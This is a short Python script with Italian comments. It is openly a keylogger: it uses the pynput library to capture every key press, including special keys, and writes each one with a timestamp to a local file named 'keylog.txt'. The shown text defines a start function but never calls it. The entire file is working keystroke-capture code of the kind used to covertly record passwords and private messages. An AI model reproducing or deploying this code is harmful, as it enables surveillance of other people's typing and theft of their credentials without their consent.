import pynput.keyboard
import logging

# Impostazioni di logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Funzione di callback per quando un tasto viene premuto
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

# Inizializza il listener per la tastiera
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        print("🔑 Keylogger in esecuzione... Premi Ctrl+C per fermarlo.")
        listener.join()
